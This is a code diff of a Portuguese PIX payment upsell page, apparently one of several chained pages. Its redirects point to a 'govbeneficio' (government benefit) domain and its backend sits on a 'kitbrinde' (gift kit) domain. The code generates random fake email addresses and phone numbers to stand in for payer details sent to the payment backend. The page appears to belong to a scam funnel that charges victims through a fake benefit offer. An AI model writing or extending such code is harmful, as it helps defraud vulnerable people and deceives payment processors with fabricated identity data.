@@ -170,23 +170,22 @@
 
 <script>
 // =====================================================
-// CONFIGURAÇÃO
+// CONFIGURAÇÃO DO UPSELL
 // =====================================================
-var MEU_PHP_UPSELL = 'https://kitbrinde.online/processar_upsell.php';
-var PARADISE_PRODUCT_HASH = 'prod_f9f49d1b4ff47783'; 
-
-// Único redirecionamento de Upsell
-var UPSELL3_REDIRECT = 'https://govbeneficio.vercel.app/up5.html';
-
+var BACKEND_URL = 'https://kitbrinde.online';
+var UPSELL_NOME = 'up4'; // Nome para UTM/Descricao
+var UPSELL_VALOR_CENTAVOS = 8500; // Ex: 1320 = R$ 13,20
+var PROXIMO_UPSELL_REDIRECT = 'https://govbeneficio.vercel.app/up2.html';
 // =====================================================
+
 var _txid          = null;
 var _pixCode       = '';
 var _qrImage       = '';
 var _expiryTimer   = null;
 var _pixTimer      = null;
-var _paymentAmount = 8500;
+var _paymentAmount = UPSELL_VALOR_CENTAVOS; 
 var _customerData  = {};
-var STORAGE_KEY    = 'mangofy_pix_tx5';
+var STORAGE_KEY    = 'mangofy_pix_tx2';
 
 var _p            = new URLSearchParams(window.location.search);
 var _utm_source   = _p.get('utm_source')   || '';
@@ -194,6 +193,7 @@ var _utm_medium   = _p.get('utm_medium')   || '';
 var _utm_campaign = _p.get('utm_campaign') || '';
 var _utm_content  = _p.get('utm_content')  || '';
 var _utm_term     = _p.get('utm_term')     || '';
+var _utm_id       = _p.get('utm_id')       || '';
 var _src          = _p.get('src')          || '';
 var _sck          = _p.get('sck')          || '';
 
@@ -201,20 +201,11 @@ function getP(key) {
     var p = new URLSearchParams(window.location.search);
     return p.get(key) || '';
 }
-function formatCPF(c) {
-    return (c||'').replace(/\D/g,'').replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,'$1.$2.$3-$4');
-}
-function fmtBRL(cents) {
-    return (cents/100).toLocaleString('pt-BR',{style:'currency',currency:'BRL'});
-}
-function randomEmail(cpf) {
-    var s = (cpf||'').replace(/\D/g,'').slice(-8);
-    return 'cpf'+s+Math.floor(Math.random()*100)+'@gmail.com';
-}
-function randomPhone() {
-    var ddds = ['11','21','31','41','47','48','51','61','71','81','85'];
-    return ddds[Math.floor(Math.random()*ddds.length)] + (Math.floor(10000000+Math.random()*90000000));
-}
+function formatarNome(n){if(!n)return '';return n.toLowerCase().split(' ').filter(Boolean).map(function(w){return w.charAt(0).toUpperCase()+w.slice(1);}).join(' ');}
+function formatCPF(c) { return (c||'').replace(/\D/g,'').replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,'$1.$2.$3-$4'); }
+function fmtBRL(cents) { return (cents/100).toLocaleString('pt-BR',{style:'currency',currency:'BRL'}); }
+function randomEmail(cpf) { var s = (cpf||'').replace(/\D/g,'').slice(-8); return 'cpf'+s+Math.floor(Math.random()*100)+'@gmail.com'; }
+function randomPhone() { var ddds = ['11','21','31','41','47','48','51','61','71','81','85']; return ddds[Math.floor(Math.random()*ddds.length)] + (Math.floor(10000000+Math.random()*90000000)); }
 function saveTx(data) { try { localStorage.setItem(STORAGE_KEY, JSON.stringify(data)); } catch(e){} }
 function loadTx() {
     try {
@@ -244,16 +235,12 @@ function setStatus(type, html) {
     el.style.display = 'block';
     el.innerHTML = html;
 }
-function displayQRCode(pixCodeStr, qrImageStr) {
+function displayQRCode(pixCodeStr) {
     var el = document.getElementById('qrcode');
     el.innerHTML = '';
-    if (!pixCodeStr && !qrImageStr) return;
+    if (!pixCodeStr) return;
     var img = document.createElement('img');
-    if(qrImageStr) {
-        img.src = qrImageStr;
-    } else {
-        img.src = 'https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=' + encodeURIComponent(pixCodeStr);
-    }
+    img.src = 'https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=' + encodeURIComponent(pixCodeStr);
     img.alt = 'QR Code PIX';
     img.style.cssText = 'max-width:100%;height:auto;display:block;margin:0 auto; border-radius: 8px;';
     el.appendChild(img);
@@ -307,8 +294,8 @@ async function copyPixCode() {
 function updateDiscountBadge() {
     var badge = document.getElementById('discountBadge');
     if (!badge) return;
-    if (_paymentAmount < 8500) {
-        badge.textContent = 'Você ganhou ' + Math.round((8500-_paymentAmount)/8500*100) + '% de desconto!';
+    if (_paymentAmount < UPSELL_VALOR_CENTAVOS) {
+        badge.textContent = 'Você ganhou ' + Math.round((UPSELL_VALOR_CENTAVOS-_paymentAmount)/UPSELL_VALOR_CENTAVOS*100) + '% de desconto!';
         badge.classList.add('show');
     } else { badge.classList.remove('show'); }
 }
@@ -321,37 +308,41 @@ function renderPix() {
         document.getElementById('payerInfo').style.display = 'block';
     }
     document.getElementById('pixCode').textContent = _pixCode;
-    displayQRCode(_pixCode, _qrImage);
+    displayQRCode(_pixCode);
     togglePaymentMethod('copy');
     showPix();
 }
 
 // =====================================================
-// REDIRECIONA APÓS APROVAÇÃO
+// REDIRECIONA APÓS APROVAÇÃO 
 // =====================================================
 function redirectAfterPayment() {
-    var url  = new URL(UPSELL3_REDIRECT);
+    var url  = new URL(PROXIMO_UPSELL_REDIRECT); 
     var cur  = new URLSearchParams(window.location.search);
     cur.forEach(function(value, key) { url.searchParams.set(key, value); });
     window.location.href = url.toString(); 
 }
 
 // =====================================================
-// POLLING (Verifica pagamento de 2 em 2 segundos)
+// POLLING (Verifica se pagou consultando seu status_pix.php)
 // =====================================================
 function pixPolling() {
     if (_pixTimer) clearInterval(_pixTimer);
     _pixTimer = setInterval(async function() {
         try {
             if (!_txid) return;
-            var r = await fetch(MEU_PHP_UPSELL + '?transactionId=' + encodeURIComponent(_txid));
+            // Busca o status usando a mesma URL do seu Index modelo
+            var r = await fetch(BACKEND_URL + '/status_pix.php?id=' + encodeURIComponent(_txid));
             var s = await r.json();
-            if (s.status === 'approved' || s.status === 'approved_manual') {
+            
+            if (!s.success) return;
+
+            if (s.status === 'approved') {
                 clearInterval(_pixTimer);
                 paymentApproved();
             }
         } catch(e) {}
-    }, 2000);
+    }, 3000); // Polling a cada 3s para evitar sobrecarga (igual ao seu modelo)
 }
 
 // =====================================================
@@ -360,60 +351,62 @@ function pixPolling() {
 async function paymentApproved(){
     clearTx();
     setStatus('paid', '<div class="status-icon">✅</div><div class="status-text">Pagamento confirmado! Redirecionando...</div>');
-    redirectAfterPayment();
+    
+    setTimeout(function() {
+        redirectAfterPayment();
+    }, 1500);
 }
 
 // =====================================================
-// CRIA PIX — PARADISE API
+// CRIA PIX (Manda as informações no formato exato que seu criar_pix.php pede)
 // =====================================================
 async function createPix() {
     var nome     = getP('nome') || getP('name') || '';
-    var cpf      = (getP('documento') || getP('cpf')).replace(/\D/g,'');
+    var cpf      = (getP('documento') || getP('cpf') || '').replace(/\D/g,'');
     var email    = getP('email') || randomEmail(cpf);
     var telefone = (getP('telefone') || getP('phone') || randomPhone()).replace(/\D/g,'');
     
     var valorRaw = getP('valor');
-    var valor    = valorRaw ? parseInt(valorRaw.replace(/\D/g,''),10) : 8500;
-    if (isNaN(valor) || valor <= 0) valor = 8500;
+    var valor    = valorRaw ? parseInt(valorRaw.replace(/\D/g,''),10) : UPSELL_VALOR_CENTAVOS;
+    if (isNaN(valor) || valor <= 0) valor = UPSELL_VALOR_CENTAVOS;
     
-    var nomeEnvio = nome.trim();
-    if (nomeEnvio.split(' ').filter(Boolean).length < 2) nomeEnvio += ' Pagador';
+    var nomeOk = formatarNome(nome) || 'Cliente';
     
     _paymentAmount = valor;
-    _customerData  = { nome: nome, documento: cpf, email: email, telefone: telefone };
+    _customerData  = { nome: nomeOk, documento: cpf, email: email, telefone: telefone };
 
     var payload = {
-        amount_cents: _paymentAmount,
-        product_hash: PARADISE_PRODUCT_HASH,
-        customer: {
-            name: nomeEnvio,
-            document: cpf,
-            email: email,
-            phone: telefone
-        },
-        utm_data: {
-            utm_source: _utm_source,
-            utm_medium: _utm_medium,
-            utm_campaign: _utm_campaign,
-            utm_content: _utm_content,
-            utm_term: _utm_term,
-            src: _src,
-            sck: _sck
-        }
+        nome:         nomeOk,
+        cpf:          cpf,
+        email:        email,
+        telefone:     telefone,
+        valor:        _paymentAmount,
+        descricao:    UPSELL_NOME, // Envia o nome customizado do Upsell
+        utm_source:   _utm_source,
+        utm_medium:   _utm_medium,
+        utm_campaign: _utm_campaign,
+        utm_content:  _utm_content,
+        utm_term:     _utm_term,
+        utm_id:       _utm_id,
+        src:          _src,
+        sck:          _sck
     };
 
-    var response = await fetch(MEU_PHP_UPSELL, {
+    var res = await fetch(BACKEND_URL + '/criar_pix.php', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(payload)
     });
     
-    var data = await response.json();
-    if(!response.ok || !data.qr_code) throw new Error(data.message || 'Erro ao gerar PIX com Paradise');
+    var data = await res.json();
+    
+    if(!res.ok || !data.success) {
+        throw new Error(data.error || 'Erro ao gerar PIX');
+    }
 
-    _txid    = data.transaction_id || '';
-    _pixCode = data.qr_code || '';
-    _qrImage = data.qr_code_base64 || '';
+    _txid    = data.paymentCode || '';
+    _pixCode = data.pixCode || '';
+    _qrImage = ''; // QR Code vai ser gerado nativamente pelo JS
     
     var expiryMs = Date.now() + 600000;
     saveTx({
